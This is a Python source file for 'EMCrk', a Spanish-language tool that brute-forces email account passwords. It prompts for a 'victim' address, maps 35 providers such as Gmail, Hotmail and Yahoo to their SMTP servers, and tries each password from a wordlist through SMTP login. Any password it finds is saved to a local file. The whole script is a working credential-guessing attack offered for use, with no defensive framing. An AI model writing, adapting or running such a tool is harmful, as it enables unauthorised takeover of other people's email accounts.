﻿# -*- coding: utf-8 -*-
# Python 3.5
#
#                                                         
#              ███████╗███╗   ███╗ ██████╗██████╗ ██╗  ██╗
#              ██╔════╝████╗ ████║██╔════╝██╔══██╗██║ ██╔╝
#              █████╗  ██╔████╔██║██║     ██████╔╝█████╔╝ 
#              ██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔═██╗ 
#              ███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██╗
#              ╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝
#                                                         
#                                                        By: LawlietJH

from BannerEMCrk import Banner
import os.path as path
import optparse
import argparse
import smtplib
import time
import sys
import os

Autor = "By: LawlietJH"
Version = "v1.1.1"
xD = False
xD2 = False
NombA = "pwd.zion"

#EMCrk - Banner Random
banner = str(Banner()+"{:>71}".format(Version)+"\n\n{:^80}".format("[-] Obten Contraseñas de Cuentas de Correos Por Fuerza Bruta [-]"))

ServC = """\n             35 Servicios De Correos Soportados En Este Script
                                                                            
 [*] gmail.com       [*] hotmail.com     [*] mail.com        [*] yahoo.com   
 [*] ymail.com       [*] roketmail.com   [*] gmx.es          [*] zoho.com    
 [*] fastmail.com    [*] hushmail.com    [*] live.com        [*] aol.com     
 [*] airmail.net     [*] 1and1.com       [*] att.net         [*] bluewin.ch  
 [*] btconnect.com   [*] earthlink.net   [*] hotpop.com      [*] inbox.com   
 [*] libero.it       [*] lycos.com       [*] o2.com          [*] orange.com  
 [*] terra.com       [*] tiscali.co.uk   [*] virgin.net      [*] wanadoo.fr  
 [*] housemusic.com  [*] web.de          [*] verizon.net     [*] comcast.net 
 [*] upla.cl         [*] udec.cl         [*] rediffmail.com

"""

ModoDeUso = """\n   Modo De Uso:\n\n\t\t EMCrk.py [-v][-s] | [-a] | [-h]
\n\n\t -a, --all \t\t Muestra todos los datos juntos y continua\n\t\t\t\t con la ejecución normal del Script.
\n\t -h, --help \t\t Muestra el Modo De Uso.
\n\t -s, --serv \t\t Muestra la lista de servicios de correos\n\t\t\t\t soportados.
\n\t -v, --version \t\t Muestra la versión y autor del Script.
"""


def Correo():
	
	global nombSMTP
	global Usuario
	global xD2
	
	while xD2 == False:
	
		xD2 = True
		
		Usuario = input("\n\n [+] Dirección de Correo de la Victima: ")
	
		#Se Usara El Nombre SMTP dependiendo de el servicio de correo.
		if Usuario.lower().endswith('@gmail.com'):
			nombSMTP = "smtp.gmail.com"
		elif Usuario.lower().endswith('@hotmail.com'):
			nombSMTP = "smtp.outlook.com"
		elif Usuario.lower().endswith('@zoho.com'):
			nombSMTP = "smtp.zoho.com"
		elif Usuario.lower().endswith('@gmx.es'):
			nombSMTP = "smtp.gmx.es"
		elif Usuario.lower().endswith('@gmx.net'):
			nombSMTP = "mail.gmx.net"
		elif Usuario.lower().endswith('@live.com'):
			nombSMTP = "smtp.live.com"
		elif Usuario.lower().endswith('@mail.com'):
			nombSMTP = "smtp.mail.com"
		elif Usuario.lower().endswith('@aol.com'):
			nombSMTP = "smtp.aol.com"
		elif Usuario.lower().endswith('@fastmail.com'):
			nombSMTP = "smtp.fastmail.com"
		elif Usuario.lower().endswith('@airmail.net'):
			nombSMTP = "mail.airmail.net"
		elif Usuario.lower().endswith('@hushmail.com'):
			nombSMTP = "smtp.hushmail.com"
		elif Usuario.lower().endswith('@1and1.com'):
			nombSMTP = "smtp.1and1.com"
		elif Usuario.lower().endswith('@att.net'):
			nombSMTP = "outbound.att.net"
		elif Usuario.lower().endswith('@bluewin.ch'):
			nombSMTP = "smtpauths.bluewin.ch"
		elif Usuario.lower().endswith('@btconnect.com'):
			nombSMTP = "mail.btconnect.tom"
		elif Usuario.lower().endswith('@earthlink.net'):
			nombSMTP = "smtpauth.earthlink.net"
		elif Usuario.lower().endswith('@hotpop.com'):
			nombSMTP = "mail.hotpop.com"
		elif Usuario.lower().endswith('@libero.it'):
			nombSMTP = "mail.libero.it"
		elif Usuario.lower().endswith('@lycos.com'):
			nombSMTP = "smtp.lycos.com"
		elif Usuario.lower().endswith('@o2.com'):
			nombSMTP = "smtp.o2.com"
		elif Usuario.lower().endswith('@oragne.com'):
			nombSMTP = "smtp.orange.com"
		elif Usuario.lower().endswith('@terra.com'):
			nombSMTP = "smtp.terra.com"
		elif Usuario.lower().endswith('@tiscali.co.uk'):
			nombSMTP = "smtp.tiscali.co.uk"
		elif Usuario.lower().endswith('@virgin.net'):
			nombSMTP = "smtp.virgin.net"
		elif Usuario.lower().endswith('@wanadoo.fr'):
			nombSMTP = "smtp.wanadoo.fr"
		elif Usuario.lower().endswith('@inbox.com'):
			nombSMTP = "smtp.inbox.com"
		elif Usuario.lower().endswith(('@yahoo.com', '@roketmail.com', '@ymail.com')):
			nombSMTP = "smtp.mail.yahoo.com"
		elif Usuario.lower().endswith('@housemusic.com'):
			nombSMTP = "smtp.housemusic.com"
		elif Usuario.lower().endswith('@rediffmail.com'):
			nombSMTP = "smtp.rediffmail.com"
		elif Usuario.lower().endswith('@comcast.net'):
			nombSMTP = "smtp.comcast.net"
		elif Usuario.lower().endswith('@web.de'):
			nombSMTP = "smtp.web.de"
		elif Usuario.lower().endswith('@verizon.net'):
			nombSMTP = "outgoing.verizon.net"
		elif Usuario.lower().endswith('@upla.cl'):
			nombSMTP = "smtp.upla.cl"
		elif Usuario.lower().endswith('@udec.cl'):
			nombSMTP = "smtp.udec.cl"
		else:
			print("\n\t\t [!] Correo No Válido.")
			os.system('Timeout /nobreak 02 > Nul')
			xD2 = False
	

def Diccionario(NombreA):
	
	global Archivo
	
	#Se Pide El Diccionario
	#~ NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")

	#Comprobamos Si Existe El Diccionario
	if path.exists(NombreA):
		Archivo = NombreA
		
	elif NombreA == "":
		Archivo = "pwd.ZioN"
		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.ZioN")
	
		if not path.exists("pwd.ZioN"):
			print("\n\t [!] No Se Ha Creado El Diccionario pwd.ZioN.")
			resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
			
			if resp == "S" or resp == "Si" or resp == "SI" or resp == "si" or resp == "s":
				print("\n\t [+] Se creará el archivo pwd.zion.")
				print("\n\t [+] Puedes añadirle palabras desde bloc de notas.")
				Zion=open("pwd.zion","w")
				Zion.close
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)
			else:
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)
				
	else:
		print("\n\t [!] No se encontro el Diccionario: "+NombreA)
		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.ZioN")
		Archivo = "pwd.ZioN"
		os.system('Timeout /nobreak 02 > Nul')
	
		if not path.exists("pwd.zion"):
			print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
			resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
		
			if resp == "S" or resp == "Si" or resp == "SI" or resp == "si" or resp == "s":
				print("\n\t [+] Se creará el archivo pwd.zion.")
				print("\n\t [+] Puedes añadirle palabras desde bloc de notas.")
				Zion=open("pwd.zion","w")
				Zion.close
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)
			else:
				print("\n\n\t [*] Saliendo...")
				os.system('Timeout /nobreak 02 > Nul')
				exit(0)


def Conexion():
	
	global Archivo
	global Usuario
	
	TI=time.time()
	TiempoI = time.strftime("\n\n\n\t [!] Iniciado:   %d/%m/%Y %H:%M:%S")
	
	#SMTP Puerto 587/TCP (Para Clientes de Correo). Otros SMTP: 25 y 645.
	smtpserver = smtplib.SMTP(str(nombSMTP), 587)
	smtpserver.ehlo()
	smtpserver.starttls()

	# Abrimos El Diccionario
	Archivo = open(Archivo, "r")


	print("\n\n [!] Intentando...\n\n\n")

	for Pwd in Archivo:
		try:
			smtpserver.login(Usuario, Pwd)
			print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
			global xD
			global xD2
			xD = True
			xD2 = False
			
			passwd=open('CC.ZioN','a')
			
			FechaF = time.strftime("\n\n\t [*] Fecha: %d/%m/%Y %H:%M:%S")
			Datos="\n\t"+FechaF+\
			      "\n\t ____________________________________________________ "+\
			      "\n\n\t [+] Correo: "+str(Usuario)+"\n\n\t [+] Contraseña: "+str(Pwd)+\
			      "\n\t ==================================================== "
			passwd.write(Datos)
			passwd.close()
			print(time.strftime("\n\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
			print("\n\t [!] La Contraseña ha sido exitosamente encontrada.")
			print("\n\t [+] Fue Guardada En El Archivo CC.zion.\n\n\t "+Autor)
			os.system('Timeout /nobreak 03 > Nul')
			exit(0)
		except KeyboardInterrupt:
			print("\n\n\t Cancelando Operación...")
			os.system('Timeout /nobreak 03 > Nul')
			exit(1)
		except smtplib.SMTPAuthenticationError:
			print ("\t [*] " + str(Pwd))
		except smtplib.SMTPServerDisconnected:
			print("\n\t El Servidor Ha Cerrado La Conexión...  Reintentando...")
			os.system('Timeout /nobreak 03 > Nul')
			main()
		except Exception as ex:
			print( type(ex).__name__ ) #Para ver cuando ocurre un error y poder añadirlo a las ecepciones, y no cierre el programa.
		#~ finally:
			#~ Arch = open("Archivo.zion", "w")
			#~ Arch.write("*"+Pwd) 
	
	TiempoF = time.strftime("\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S")
	TF=time.time()
	Tiempo = TF-TI
	print(TiempoI)
	print(TiempoF)
	print("\n\n\t Tiempo Transcurrido: {:.2f} segundos".format(Tiempo))

def main():
	
	global NombA
	os.system("cls")
	
	if len(sys.argv) == 2:
		
		if sys.argv[1] == "-h" or sys.argv[1] == "--help":
			print(ModoDeUso)
			exit(0)
			
		if sys.argv[1] == "-s" or sys.argv[1] == "--serv":
			print(ServC)
			exit(0)
			
		if sys.argv[1] == "-v" or sys.argv[1] == "--version":
			print("\n\n{:^80}\n{:^80}\n{:^80}".format("EMCrk",Autor[4:],Version[1:]))
			exit(0)	
			
		if sys.argv[1] == "-a" or sys.argv[1] == "--all":
			print("\n\n{:^80}\n{:^80}\n{:^80}".format("EMCrk",Autor[4:],Version[1:]))
			print(ServC)
			
			print(banner)
			Diccionario(NombA)
			Correo()
			print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
			Conexion()
			print(time.strftime("\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
			print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
			os.system('Timeout /nobreak 03 > Nul')
			
		if not sys.argv[1] == "-a" and not sys.argv[1] == "--all"\
		and not sys.argv[1] == "-h" and not sys.argv[1] == "--help"\
		and not sys.argv[1] == "-s" and not sys.argv[1] == "--serv"\
		and not sys.argv[1] == "-v" and not sys.argv[1] == "--version":
			print(ModoDeUso)
			
	elif len(sys.argv) == 3:
		
		if sys.argv[1] == "-v" or sys.argv[1] == "--version"\
		or sys.argv[2] == "-v" or sys.argv[2] == "--version":
			print("\n\n{:^80}\n{:^80}\n{:^80}".format("EMCrk",Autor[4:],Version[1:]))
			
		if sys.argv[1] == "-s" or sys.argv[1] == "--serv"\
		or sys.argv[2] == "-s" or sys.argv[2] == "--serv":
			print(ServC)
			exit(0)
			
		if sys.argv[1] == "-d" or sys.argv[1] == "--diccionario":
			
			NombA = sys.argv[2]
			
			print(banner)
			Diccionario(NombA)
			Correo()
			Conexion()
			print(time.strftime("\t [!] Iniciado: %d/%m/%Y %H:%M:%S"))
			print(time.strftime("\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
			print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
			os.system('Timeout /nobreak 03 > Nul')
			
		if not sys.argv[1] == "-a" and not sys.argv[1] == "--all"\
		and not sys.argv[1] == "-d" and not sys.argv[1] == "--diccionario"\
		and not sys.argv[1] == "-s" and not sys.argv[1] == "--serv"\
		and not sys.argv[1] == "-v" and not sys.argv[1] == "--version"\
		and not sys.argv[2] == "-s" and not sys.argv[2] == "--serv"\
		and not sys.argv[2] == "-v" and not sys.argv[2] == "--version":
			print(ModoDeUso)
	
	elif len(sys.argv) > 3:
		print(ModoDeUso)
		
	else:
		print(banner)
		Diccionario(NombA)
		print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.ZioN")
		Correo()
		
		Conexion()
		
		if xD == False:
			
			resp=input("\n\n\t Deseas volver a intentarlo? [S/N]: ")
			
			if resp == "S" or resp == "s" or resp == "SI" or resp == "Si" or resp == "si":
				print ("\n\n\n\t\t [*] Volviendo a intentarlo...\n\n")
				os.system('Timeout /nobreak 03 > Nul')
				main()
			else:
				print("\n\n\n\t\t Saliendo...")
				os.system('Timeout /nobreak 03 > Nul')
				exit(0)
		
		os.system('Timeout /nobreak 03 > Nul')


main()
